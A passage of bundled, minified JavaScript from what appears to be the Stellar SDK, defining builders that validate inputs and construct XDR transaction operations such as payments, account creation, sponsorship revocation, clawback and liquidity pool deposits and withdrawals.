        var ae = new b.default.ChangeTrustOp(ee)
          , ne = {};
        return ne.body = b.default.OperationBody.changeTrust(ae),
        this.setSourceAccount(ne, Q),
        new b.default.Operation(ne)
    }
    return change_trust$1
}
var create_account$1 = {}, hasRequiredCreate_account$1;
function requireCreate_account$1() {
    if (hasRequiredCreate_account$1)
        return create_account$1;
    hasRequiredCreate_account$1 = 1,
    Object.defineProperty(create_account$1, "__esModule", {
        value: !0
    }),
    create_account$1.createAccount = w;
    var _ = requireStellarXdr_generated()
      , M = x(_)
      , j = requireKeypair$1()
      , O = requireStrkey$1();
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    function w(b) {
        if (!O.StrKey.isValidEd25519PublicKey(b.destination))
            throw new Error("destination is invalid");
        if (!this.isValidAmount(b.startingBalance, !0))
            throw new TypeError("startingBalance must be of type String, represent a non-negative number and have at most 7 digits after the decimal");
        var X = {};
        X.destination = j.Keypair.fromPublicKey(b.destination).xdrAccountId(),
        X.startingBalance = this._toXDRAmount(b.startingBalance);
        var Y = new M.default.CreateAccountOp(X)
          , F = {};
        return F.body = M.default.OperationBody.createAccount(Y),
        this.setSourceAccount(F, b),
        new M.default.Operation(F)
    }
    return create_account$1
}
var create_claimable_balance$1 = {}, hasRequiredCreate_claimable_balance$1;
function requireCreate_claimable_balance$1() {
    if (hasRequiredCreate_claimable_balance$1)
        return create_claimable_balance$1;
    hasRequiredCreate_claimable_balance$1 = 1,
    Object.defineProperty(create_claimable_balance$1, "__esModule", {
        value: !0
    }),
    create_claimable_balance$1.createClaimableBalance = x;
    var _ = requireStellarXdr_generated()
      , M = O(_)
      , j = requireAsset$1();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x(w) {
        if (!(w.asset instanceof j.Asset))
            throw new Error("must provide an asset for create claimable balance operation");
        if (!this.isValidAmount(w.amount))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        if (!Array.isArray(w.claimants) || w.claimants.length === 0)
            throw new Error("must provide at least one claimant");
        var b = {};
        b.asset = w.asset.toXDRObject(),
        b.amount = this._toXDRAmount(w.amount),
        b.claimants = w.claimants.map(function(F) {
            return F.toXDRObject()
        });
        var X = new M.default.CreateClaimableBalanceOp(b)
          , Y = {};
        return Y.body = M.default.OperationBody.createClaimableBalance(X),
        this.setSourceAccount(Y, w),
        new M.default.Operation(Y)
    }
    return create_claimable_balance$1
}
var claim_claimable_balance$1 = {}, hasRequiredClaim_claimable_balance$1;
function requireClaim_claimable_balance$1() {
    if (hasRequiredClaim_claimable_balance$1)
        return claim_claimable_balance$1;
    hasRequiredClaim_claimable_balance$1 = 1,
    Object.defineProperty(claim_claimable_balance$1, "__esModule", {
        value: !0
    }),
    claim_claimable_balance$1.claimClaimableBalance = O,
    claim_claimable_balance$1.validateClaimableBalanceId = x;
    var _ = requireStellarXdr_generated()
      , M = j(_);
    function j(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function O() {
        var w = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        x(w.balanceId);
        var b = {};
        b.balanceId = M.default.ClaimableBalanceId.fromXDR(w.balanceId, "hex");
        var X = new M.default.ClaimClaimableBalanceOp(b)
          , Y = {};
        return Y.body = M.default.OperationBody.claimClaimableBalance(X),
        this.setSourceAccount(Y, w),
        new M.default.Operation(Y)
    }
    function x(w) {
        if (typeof w != "string" || w.length !== 72)
            throw new Error("must provide a valid claimable balance id")
    }
    return claim_claimable_balance$1
}
var clawback_claimable_balance$1 = {}, hasRequiredClawback_claimable_balance$1;
function requireClawback_claimable_balance$1() {
    if (hasRequiredClawback_claimable_balance$1)
        return clawback_claimable_balance$1;
    hasRequiredClawback_claimable_balance$1 = 1,
    Object.defineProperty(clawback_claimable_balance$1, "__esModule", {
        value: !0
    }),
    clawback_claimable_balance$1.clawbackClaimableBalance = x;
    var _ = requireStellarXdr_generated()
      , M = O(_)
      , j = requireClaim_claimable_balance$1();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x() {
        var w = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        (0,
        j.validateClaimableBalanceId)(w.balanceId);
        var b = {
            balanceId: M.default.ClaimableBalanceId.fromXDR(w.balanceId, "hex")
        }
          , X = {
            body: M.default.OperationBody.clawbackClaimableBalance(new M.default.ClawbackClaimableBalanceOp(b))
        };
        return this.setSourceAccount(X, w),
        new M.default.Operation(X)
    }
    return clawback_claimable_balance$1
}
var inflation$1 = {}, hasRequiredInflation$1;
function requireInflation$1() {
    if (hasRequiredInflation$1)
        return inflation$1;
    hasRequiredInflation$1 = 1,
    Object.defineProperty(inflation$1, "__esModule", {
        value: !0
    }),
    inflation$1.inflation = O;
    var _ = requireStellarXdr_generated()
      , M = j(_);
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O() {
        var x = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , w = {};
        return w.body = M.default.OperationBody.inflation(),
        this.setSourceAccount(w, x),
        new M.default.Operation(w)
    }
    return inflation$1
}
var manage_data$1 = {}, hasRequiredManage_data$1;
function requireManage_data$1() {
    if (hasRequiredManage_data$1)
        return manage_data$1;
    hasRequiredManage_data$1 = 1,
    Object.defineProperty(manage_data$1, "__esModule", {
        value: !0
    }),
    manage_data$1.manageData = w;
    var _ = requireIsString()
      , M = x(_)
      , j = requireStellarXdr_generated()
      , O = x(j);
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    function w(b) {
        var X = {};
        if (!((0,
        M.default)(b.name) && b.name.length <= 64))
            throw new Error("name must be a string, up to 64 characters");
        if (X.dataName = b.name,
        !(0,
        M.default)(b.value) && !Buffer.isBuffer(b.value) && b.value !== null)
            throw new Error("value must be a string, Buffer or null");
        if ((0,
        M.default)(b.value) ? X.dataValue = Buffer.from(b.value) : X.dataValue = b.value,
        X.dataValue !== null && X.dataValue.length > 64)
            throw new Error("value cannot be longer that 64 bytes");
        var Y = new O.default.ManageDataOp(X)
          , F = {};
        return F.body = O.default.OperationBody.manageData(Y),
        this.setSourceAccount(F, b),
        new O.default.Operation(F)
    }
    return manage_data$1
}
var manage_buy_offer$1 = {}, hasRequiredManage_buy_offer$1;
function requireManage_buy_offer$1() {
    if (hasRequiredManage_buy_offer$1)
        return manage_buy_offer$1;
    hasRequiredManage_buy_offer$1 = 1,
    Object.defineProperty(manage_buy_offer$1, "__esModule", {
        value: !0
    }),
    manage_buy_offer$1.manageBuyOffer = b;
    var _ = requireIsUndefined()
      , M = w(_)
      , j = requireLib$4()
      , O = requireStellarXdr_generated()
      , x = w(O);
    function w(X) {
        return X && X.__esModule ? X : {
            default: X
        }
    }
    function b(X) {
        var Y = {};
        if (Y.selling = X.selling.toXDRObject(),
        Y.buying = X.buying.toXDRObject(),
        !this.isValidAmount(X.buyAmount, !0))
            throw new TypeError(this.constructAmountRequirementsError("buyAmount"));
        if (Y.buyAmount = this._toXDRAmount(X.buyAmount),
        (0,
        M.default)(X.price))
            throw new TypeError("price argument is required");
        Y.price = this._toXDRPrice(X.price),
        (0,
        M.default)(X.offerId) ? X.offerId = "0" : X.offerId = X.offerId.toString(),
        Y.offerId = j.Hyper.fromString(X.offerId);
        var F = new x.default.ManageBuyOfferOp(Y)
          , V = {};
        return V.body = x.default.OperationBody.manageBuyOffer(F),
        this.setSourceAccount(V, X),
        new x.default.Operation(V)
    }
    return manage_buy_offer$1
}
var path_payment_strict_receive$1 = {}, hasRequiredPath_payment_strict_receive$1;
function requirePath_payment_strict_receive$1() {
    if (hasRequiredPath_payment_strict_receive$1)
        return path_payment_strict_receive$1;
    hasRequiredPath_payment_strict_receive$1 = 1,
    Object.defineProperty(path_payment_strict_receive$1, "__esModule", {
        value: !0
    }),
    path_payment_strict_receive$1.pathPaymentStrictReceive = x;
    var _ = requireStellarXdr_generated()
      , M = O(_)
      , j = requireDecode_encode_muxed_account$1();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x(w) {
        switch (!0) {
        case !w.sendAsset:
            throw new Error("Must specify a send asset");
        case !this.isValidAmount(w.sendMax):
            throw new TypeError(this.constructAmountRequirementsError("sendMax"));
        case !w.destAsset:
            throw new Error("Must provide a destAsset for a payment operation");
        case !this.isValidAmount(w.destAmount):
            throw new TypeError(this.constructAmountRequirementsError("destAmount"))
        }
        var b = {};
        b.sendAsset = w.sendAsset.toXDRObject(),
        b.sendMax = this._toXDRAmount(w.sendMax);
        try {
            b.destination = (0,
            j.decodeAddressToMuxedAccount)(w.destination, w.withMuxing)
        } catch {
            throw new Error("destination is invalid")
        }
        b.destAsset = w.destAsset.toXDRObject(),
        b.destAmount = this._toXDRAmount(w.destAmount);
        var X = w.path ? w.path : [];
        b.path = X.map(function(V) {
            return V.toXDRObject()
        });
        var Y = new M.default.PathPaymentStrictReceiveOp(b)
          , F = {};
        return F.body = M.default.OperationBody.pathPaymentStrictReceive(Y),
        this.setSourceAccount(F, w),
        new M.default.Operation(F)
    }
    return path_payment_strict_receive$1
}
var path_payment_strict_send$1 = {}, hasRequiredPath_payment_strict_send$1;
function requirePath_payment_strict_send$1() {
    if (hasRequiredPath_payment_strict_send$1)
        return path_payment_strict_send$1;
    hasRequiredPath_payment_strict_send$1 = 1,
    Object.defineProperty(path_payment_strict_send$1, "__esModule", {
        value: !0
    }),
    path_payment_strict_send$1.pathPaymentStrictSend = x;
    var _ = requireStellarXdr_generated()
      , M = O(_)
      , j = requireDecode_encode_muxed_account$1();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x(w) {
        switch (!0) {
        case !w.sendAsset:
            throw new Error("Must specify a send asset");
        case !this.isValidAmount(w.sendAmount):
            throw new TypeError(this.constructAmountRequirementsError("sendAmount"));
        case !w.destAsset:
            throw new Error("Must provide a destAsset for a payment operation");
        case !this.isValidAmount(w.destMin):
            throw new TypeError(this.constructAmountRequirementsError("destMin"))
        }
        var b = {};
        b.sendAsset = w.sendAsset.toXDRObject(),
        b.sendAmount = this._toXDRAmount(w.sendAmount);
        try {
            b.destination = (0,
            j.decodeAddressToMuxedAccount)(w.destination, w.withMuxing)
        } catch {
            throw new Error("destination is invalid")
        }
        b.destAsset = w.destAsset.toXDRObject(),
        b.destMin = this._toXDRAmount(w.destMin);
        var X = w.path ? w.path : [];
        b.path = X.map(function(V) {
            return V.toXDRObject()
        });
        var Y = new M.default.PathPaymentStrictSendOp(b)
          , F = {};
        return F.body = M.default.OperationBody.pathPaymentStrictSend(Y),
        this.setSourceAccount(F, w),
        new M.default.Operation(F)
    }
    return path_payment_strict_send$1
}
var payment$1 = {}, hasRequiredPayment$1;
function requirePayment$1() {
    if (hasRequiredPayment$1)
        return payment$1;
    hasRequiredPayment$1 = 1,
    Object.defineProperty(payment$1, "__esModule", {
        value: !0
    }),
    payment$1.payment = x;
    var _ = requireStellarXdr_generated()
      , M = O(_)
      , j = requireDecode_encode_muxed_account$1();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x(w) {
        if (!w.asset)
            throw new Error("Must provide an asset for a payment operation");
        if (!this.isValidAmount(w.amount))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        var b = {};
        try {
            b.destination = (0,
            j.decodeAddressToMuxedAccount)(w.destination, w.withMuxing)
        } catch {
            throw new Error("destination is invalid; did you forget to enable muxing?")
        }
        b.asset = w.asset.toXDRObject(),
        b.amount = this._toXDRAmount(w.amount);
        var X = new M.default.PaymentOp(b)
          , Y = {};
        return Y.body = M.default.OperationBody.payment(X),
        this.setSourceAccount(Y, w),
        new M.default.Operation(Y)
    }
    return payment$1
}
var set_options$1 = {}, hasRequiredSet_options$1;
function requireSet_options$1() {
    if (hasRequiredSet_options$1)
        return set_options$1;
    hasRequiredSet_options$1 = 1,
    Object.defineProperty(set_options$1, "__esModule", {
        value: !0
    }),
    set_options$1.setOptions = V;
    var _ = requireIsUndefined()
      , M = Y(_)
      , j = requireIsString()
      , O = Y(j)
      , x = requireStellarXdr_generated()
      , w = Y(x)
      , b = requireKeypair$1()
      , X = requireStrkey$1();
    function Y(K) {
        return K && K.__esModule ? K : {
            default: K
        }
    }
    function F(K, Q) {
        if (K >= 0 && K <= 255)
            return !0;
        throw new Error(Q + " value must be between 0 and 255")
    }
    function V(K) {
        var Q = {};
        if (K.inflationDest) {
            if (!X.StrKey.isValidEd25519PublicKey(K.inflationDest))
                throw new Error("inflationDest is invalid");
            Q.inflationDest = b.Keypair.fromPublicKey(K.inflationDest).xdrAccountId()
        }
        if (Q.clearFlags = this._checkUnsignedIntValue("clearFlags", K.clearFlags),
        Q.setFlags = this._checkUnsignedIntValue("setFlags", K.setFlags),
        Q.masterWeight = this._checkUnsignedIntValue("masterWeight", K.masterWeight, F),
        Q.lowThreshold = this._checkUnsignedIntValue("lowThreshold", K.lowThreshold, F),
        Q.medThreshold = this._checkUnsignedIntValue("medThreshold", K.medThreshold, F),
        Q.highThreshold = this._checkUnsignedIntValue("highThreshold", K.highThreshold, F),
        !(0,
        M.default)(K.homeDomain) && !(0,
        O.default)(K.homeDomain))
            throw new TypeError("homeDomain argument must be of type String");
        if (Q.homeDomain = K.homeDomain,
        K.signer) {
            var ee = this._checkUnsignedIntValue("signer.weight", K.signer.weight, F)
              , ae = void 0
              , ne = 0;
            if (K.signer.ed25519PublicKey) {
                if (!X.StrKey.isValidEd25519PublicKey(K.signer.ed25519PublicKey))
                    throw new Error("signer.ed25519PublicKey is invalid.");
                var oe = X.StrKey.decodeEd25519PublicKey(K.signer.ed25519PublicKey);
                ae = new w.default.SignerKey.signerKeyTypeEd25519(oe),
                ne += 1
            }
            if (K.signer.preAuthTx) {
                if ((0,
                O.default)(K.signer.preAuthTx) && (K.signer.preAuthTx = Buffer.from(K.signer.preAuthTx, "hex")),
                !(Buffer.isBuffer(K.signer.preAuthTx) && K.signer.preAuthTx.length === 32))
                    throw new Error("signer.preAuthTx must be 32 bytes Buffer.");
                ae = new w.default.SignerKey.signerKeyTypePreAuthTx(K.signer.preAuthTx),
                ne += 1
            }
            if (K.signer.sha256Hash) {
                if ((0,
                O.default)(K.signer.sha256Hash) && (K.signer.sha256Hash = Buffer.from(K.signer.sha256Hash, "hex")),
                !(Buffer.isBuffer(K.signer.sha256Hash) && K.signer.sha256Hash.length === 32))
                    throw new Error("signer.sha256Hash must be 32 bytes Buffer.");
                ae = new w.default.SignerKey.signerKeyTypeHashX(K.signer.sha256Hash),
                ne += 1
            }
            if (ne !== 1)
                throw new Error("Signer object must contain exactly one of signer.ed25519PublicKey, signer.sha256Hash, signer.preAuthTx.");
            Q.signer = new w.default.Signer({
                key: ae,
                weight: ee
            })
        }
        var ue = new w.default.SetOptionsOp(Q)
          , fe = {};
        return fe.body = w.default.OperationBody.setOptions(ue),
        this.setSourceAccount(fe, K),
        new w.default.Operation(fe)
    }
    return set_options$1
}
var begin_sponsoring_future_reserves$1 = {}, hasRequiredBegin_sponsoring_future_reserves$1;
function requireBegin_sponsoring_future_reserves$1() {
    if (hasRequiredBegin_sponsoring_future_reserves$1)
        return begin_sponsoring_future_reserves$1;
    hasRequiredBegin_sponsoring_future_reserves$1 = 1,
    Object.defineProperty(begin_sponsoring_future_reserves$1, "__esModule", {
        value: !0
    }),
    begin_sponsoring_future_reserves$1.beginSponsoringFutureReserves = w;
    var _ = requireStellarXdr_generated()
      , M = x(_)
      , j = requireStrkey$1()
      , O = requireKeypair$1();
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    function w() {
        var b = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!j.StrKey.isValidEd25519PublicKey(b.sponsoredId))
            throw new Error("sponsoredId is invalid");
        var X = new M.default.BeginSponsoringFutureReservesOp({
            sponsoredId: O.Keypair.fromPublicKey(b.sponsoredId).xdrAccountId()
        })
          , Y = {};
        return Y.body = M.default.OperationBody.beginSponsoringFutureReserves(X),
        this.setSourceAccount(Y, b),
        new M.default.Operation(Y)
    }
    return begin_sponsoring_future_reserves$1
}
var end_sponsoring_future_reserves$1 = {}, hasRequiredEnd_sponsoring_future_reserves$1;
function requireEnd_sponsoring_future_reserves$1() {
    if (hasRequiredEnd_sponsoring_future_reserves$1)
        return end_sponsoring_future_reserves$1;
    hasRequiredEnd_sponsoring_future_reserves$1 = 1,
    Object.defineProperty(end_sponsoring_future_reserves$1, "__esModule", {
        value: !0
    }),
    end_sponsoring_future_reserves$1.endSponsoringFutureReserves = O;
    var _ = requireStellarXdr_generated()
      , M = j(_);
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O() {
        var x = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , w = {};
        return w.body = M.default.OperationBody.endSponsoringFutureReserves(),
        this.setSourceAccount(w, x),
        new M.default.Operation(w)
    }
    return end_sponsoring_future_reserves$1
}
var revoke_sponsorship$1 = {}, hasRequiredRevoke_sponsorship$1;
function requireRevoke_sponsorship$1() {
    if (hasRequiredRevoke_sponsorship$1)
        return revoke_sponsorship$1;
    hasRequiredRevoke_sponsorship$1 = 1,
    Object.defineProperty(revoke_sponsorship$1, "__esModule", {
        value: !0
    }),
    revoke_sponsorship$1.revokeAccountSponsorship = F,
    revoke_sponsorship$1.revokeTrustlineSponsorship = V,
    revoke_sponsorship$1.revokeOfferSponsorship = K,
    revoke_sponsorship$1.revokeDataSponsorship = Q,
    revoke_sponsorship$1.revokeClaimableBalanceSponsorship = ee,
    revoke_sponsorship$1.revokeLiquidityPoolSponsorship = ae,
    revoke_sponsorship$1.revokeSignerSponsorship = ne;
    var _ = requireIsString()
      , M = Y(_)
      , j = requireStellarXdr_generated()
      , O = Y(j)
      , x = requireStrkey$1()
      , w = requireKeypair$1()
      , b = requireAsset$1()
      , X = requireLiquidity_pool_id$1();
    function Y(oe) {
        return oe && oe.__esModule ? oe : {
            default: oe
        }
    }
    function F() {
        var oe = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!x.StrKey.isValidEd25519PublicKey(oe.account))
            throw new Error("account is invalid");
        var ue = O.default.LedgerKey.account(new O.default.LedgerKeyAccount({
            accountId: w.Keypair.fromPublicKey(oe.account).xdrAccountId()
        }))
          , fe = O.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ue)
          , he = {};
        return he.body = O.default.OperationBody.revokeSponsorship(fe),
        this.setSourceAccount(he, oe),
        new O.default.Operation(he)
    }
    function V() {
        var oe = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!x.StrKey.isValidEd25519PublicKey(oe.account))
            throw new Error("account is invalid");
        var ue = void 0;
        if (oe.asset instanceof b.Asset)
            ue = oe.asset.toTrustLineXDRObject();
        else if (oe.asset instanceof X.LiquidityPoolId)
            ue = oe.asset.toXDRObject();
        else
            throw new TypeError("asset must be an Asset or LiquidityPoolId");
        var fe = O.default.LedgerKey.trustline(new O.default.LedgerKeyTrustLine({
            accountId: w.Keypair.fromPublicKey(oe.account).xdrAccountId(),
            asset: ue
        }))
          , he = O.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(fe)
          , pe = {};
        return pe.body = O.default.OperationBody.revokeSponsorship(he),
        this.setSourceAccount(pe, oe),
        new O.default.Operation(pe)
    }
    function K() {
        var oe = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!x.StrKey.isValidEd25519PublicKey(oe.seller))
            throw new Error("seller is invalid");
        if (!(0,
        M.default)(oe.offerId))
            throw new Error("offerId is invalid");
        var ue = O.default.LedgerKey.offer(new O.default.LedgerKeyOffer({
            sellerId: w.Keypair.fromPublicKey(oe.seller).xdrAccountId(),
            offerId: O.default.Int64.fromString(oe.offerId)
        }))
          , fe = O.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ue)
          , he = {};
        return he.body = O.default.OperationBody.revokeSponsorship(fe),
        this.setSourceAccount(he, oe),
        new O.default.Operation(he)
    }
    function Q() {
        var oe = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!x.StrKey.isValidEd25519PublicKey(oe.account))
            throw new Error("account is invalid");
        if (!(0,
        M.default)(oe.name) || oe.name.length > 64)
            throw new Error("name must be a string, up to 64 characters");
        var ue = O.default.LedgerKey.data(new O.default.LedgerKeyData({
            accountId: w.Keypair.fromPublicKey(oe.account).xdrAccountId(),
            dataName: oe.name
        }))
          , fe = O.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ue)
          , he = {};
        return he.body = O.default.OperationBody.revokeSponsorship(fe),
        this.setSourceAccount(he, oe),
        new O.default.Operation(he)
    }
    function ee() {
        var oe = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!(0,
        M.default)(oe.balanceId))
            throw new Error("balanceId is invalid");
        var ue = O.default.LedgerKey.claimableBalance(new O.default.LedgerKeyClaimableBalance({
            balanceId: O.default.ClaimableBalanceId.fromXDR(oe.balanceId, "hex")
        }))
          , fe = O.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ue)
          , he = {};
        return he.body = O.default.OperationBody.revokeSponsorship(fe),
        this.setSourceAccount(he, oe),
        new O.default.Operation(he)
    }
    function ae() {
        var oe = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!(0,
        M.default)(oe.liquidityPoolId))
            throw new Error("liquidityPoolId is invalid");
        var ue = O.default.LedgerKey.liquidityPool(new O.default.LedgerKeyLiquidityPool({
            liquidityPoolId: O.default.PoolId.fromXDR(oe.liquidityPoolId, "hex")
        }))
          , fe = O.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ue)
          , he = {
            body: O.default.OperationBody.revokeSponsorship(fe)
        };
        return this.setSourceAccount(he, oe),
        new O.default.Operation(he)
    }
    function ne() {
        var oe = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!x.StrKey.isValidEd25519PublicKey(oe.account))
            throw new Error("account is invalid");
        var ue = void 0;
        if (oe.signer.ed25519PublicKey) {
            if (!x.StrKey.isValidEd25519PublicKey(oe.signer.ed25519PublicKey))
                throw new Error("signer.ed25519PublicKey is invalid.");
            var fe = x.StrKey.decodeEd25519PublicKey(oe.signer.ed25519PublicKey);
            ue = new O.default.SignerKey.signerKeyTypeEd25519(fe)
        } else if (oe.signer.preAuthTx) {
            var he = void 0;
            if ((0,
            M.default)(oe.signer.preAuthTx) ? he = Buffer.from(oe.signer.preAuthTx, "hex") : he = oe.signer.preAuthTx,
            !(Buffer.isBuffer(he) && he.length === 32))
                throw new Error("signer.preAuthTx must be 32 bytes Buffer.");
            ue = new O.default.SignerKey.signerKeyTypePreAuthTx(he)
        } else if (oe.signer.sha256Hash) {
            var pe = void 0;
            if ((0,
            M.default)(oe.signer.sha256Hash) ? pe = Buffer.from(oe.signer.sha256Hash, "hex") : pe = oe.signer.sha256Hash,
            !(Buffer.isBuffer(pe) && pe.length === 32))
                throw new Error("signer.sha256Hash must be 32 bytes Buffer.");
            ue = new O.default.SignerKey.signerKeyTypeHashX(pe)
        } else
            throw new Error("signer is invalid");
        var ye = new O.default.RevokeSponsorshipOpSigner({
            accountId: w.Keypair.fromPublicKey(oe.account).xdrAccountId(),
            signerKey: ue
        })
          , be = O.default.RevokeSponsorshipOp.revokeSponsorshipSigner(ye)
          , xe = {};
        return xe.body = O.default.OperationBody.revokeSponsorship(be),
        this.setSourceAccount(xe, oe),
        new O.default.Operation(xe)
    }
    return revoke_sponsorship$1
}
var clawback$1 = {}, hasRequiredClawback$1;
function requireClawback$1() {
    if (hasRequiredClawback$1)
        return clawback$1;
    hasRequiredClawback$1 = 1,
    Object.defineProperty(clawback$1, "__esModule", {
        value: !0
    }),
    clawback$1.clawback = x;
    var _ = requireStellarXdr_generated()
      , M = O(_)
      , j = requireDecode_encode_muxed_account$1();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x() {
        var w = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , b = {};
        if (!this.isValidAmount(w.amount))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        b.amount = this._toXDRAmount(w.amount),
        b.asset = w.asset.toXDRObject(),
        b.from = (0,
        j.decodeAddressToMuxedAccount)(w.from);
        var X = {
            body: M.default.OperationBody.clawback(new M.default.ClawbackOp(b))
        };
        return this.setSourceAccount(X, w),
        new M.default.Operation(X)
    }
    return clawback$1
}
var set_trustline_flags$1 = {}, hasRequiredSet_trustline_flags$1;
function requireSet_trustline_flags$1() {
    if (hasRequiredSet_trustline_flags$1)
        return set_trustline_flags$1;
    hasRequiredSet_trustline_flags$1 = 1,
    Object.defineProperty(set_trustline_flags$1, "__esModule", {
        value: !0
    });
    var _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(b) {
        return typeof b
    }
    : function(b) {
        return b && typeof Symbol == "function" && b.constructor === Symbol && b !== Symbol.prototype ? "symbol" : typeof b
    }
    ;
    set_trustline_flags$1.setTrustLineFlags = w;
    var M = requireStellarXdr_generated()
      , j = x(M)
      , O = requireKeypair$1();
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    function w() {
        var b = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , X = {};
        if (_(b.flags) !== "object" || Object.keys(b.flags).length === 0)
            throw new Error("opts.flags must be an map of boolean flags to modify");
        var Y = {
            authorized: j.default.TrustLineFlags.authorizedFlag(),
            authorizedToMaintainLiabilities: j.default.TrustLineFlags.authorizedToMaintainLiabilitiesFlag(),
            clawbackEnabled: j.default.TrustLineFlags.trustlineClawbackEnabledFlag()
        }
          , F = 0
          , V = 0;
        Object.keys(b.flags).forEach(function(Q) {
            if (!Object.prototype.hasOwnProperty.call(Y, Q))
                throw new Error("unsupported flag name specified: " + Q);
            var ee = b.flags[Q]
              , ae = Y[Q].value;
            ee === !0 ? V |= ae : ee === !1 && (F |= ae)
        }),
        X.trustor = O.Keypair.fromPublicKey(b.trustor).xdrAccountId(),
        X.asset = b.asset.toXDRObject(),
        X.clearFlags = F,
        X.setFlags = V;
        var K = {
            body: j.default.OperationBody.setTrustLineFlags(new j.default.SetTrustLineFlagsOp(X))
        };
        return this.setSourceAccount(K, b),
        new j.default.Operation(K)
    }
    return set_trustline_flags$1
}
var liquidity_pool_deposit$1 = {}, hasRequiredLiquidity_pool_deposit$1;
function requireLiquidity_pool_deposit$1() {
    if (hasRequiredLiquidity_pool_deposit$1)
        return liquidity_pool_deposit$1;
    hasRequiredLiquidity_pool_deposit$1 = 1,
    Object.defineProperty(liquidity_pool_deposit$1, "__esModule", {
        value: !0
    }),
    liquidity_pool_deposit$1.liquidityPoolDeposit = w;
    var _ = requireIsUndefined()
      , M = x(_)
      , j = requireStellarXdr_generated()
      , O = x(j);
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    function w() {
        var b = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , X = b.liquidityPoolId
          , Y = b.maxAmountA
          , F = b.maxAmountB
          , V = b.minPrice
          , K = b.maxPrice
          , Q = {};
        if (!X)
            throw new TypeError("liquidityPoolId argument is required");
        if (Q.liquidityPoolId = O.default.PoolId.fromXDR(X, "hex"),
        !this.isValidAmount(Y, !0))
            throw new TypeError("maxAmountA argument is required");
        if (Q.maxAmountA = this._toXDRAmount(Y),
        !this.isValidAmount(F, !0))
            throw new TypeError("maxAmountB argument is required");
        if (Q.maxAmountB = this._toXDRAmount(F),
        (0,
        M.default)(V))
            throw new TypeError("minPrice argument is required");
        if (Q.minPrice = this._toXDRPrice(V),
        (0,
        M.default)(K))
            throw new TypeError("maxPrice argument is required");
        Q.maxPrice = this._toXDRPrice(K);
        var ee = new O.default.LiquidityPoolDepositOp(Q)
          , ae = {
            body: O.default.OperationBody.liquidityPoolDeposit(ee)
        };
        return this.setSourceAccount(ae, b),
        new O.default.Operation(ae)
    }
    return liquidity_pool_deposit$1
}
var liquidity_pool_withdraw$1 = {}, hasRequiredLiquidity_pool_withdraw$1;
function requireLiquidity_pool_withdraw$1() {
    if (hasRequiredLiquidity_pool_withdraw$1)
        return liquidity_pool_withdraw$1;
    hasRequiredLiquidity_pool_withdraw$1 = 1,
    Object.defineProperty(liquidity_pool_withdraw$1, "__esModule", {
        value: !0
    }),
    liquidity_pool_withdraw$1.liquidityPoolWithdraw = O;
    var _ = requireStellarXdr_generated()
      , M = j(_);
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O() {
        var x = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , w = {};
        if (!x.liquidityPoolId)
            throw new TypeError("liquidityPoolId argument is required");
        if (w.liquidityPoolId = M.default.PoolId.fromXDR(x.liquidityPoolId, "hex"),
        !this.isValidAmount(x.amount))
            throw new TypeError("amount argument is required");
        if (w.amount = this._toXDRAmount(x.amount),
        !this.isValidAmount(x.minAmountA, !0))
            throw new TypeError("minAmountA argument is required");
        if (w.minAmountA = this._toXDRAmount(x.minAmountA),
        !this.isValidAmount(x.minAmountB, !0))
            throw new TypeError("minAmountB argument is required");
        w.minAmountB = this._toXDRAmount(x.minAmountB);
        var b = new M.default.LiquidityPoolWithdrawOp(w)
          , X = {
            body: M.default.OperationBody.liquidityPoolWithdraw(b)
        };
        return this.setSourceAccount(X, x),
        new M.default.Operation(X)
    }
    return liquidity_pool_withdraw$1
}
var hasRequiredOperations$1;
function requireOperations$1() {
    return hasRequiredOperations$1 || (hasRequiredOperations$1 = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        });
        var M = requireManage_sell_offer$1();
        Object.defineProperty(_, "manageSellOffer", {
            enumerable: !0,
            get: function() {
                return M.manageSellOffer
            }
        });
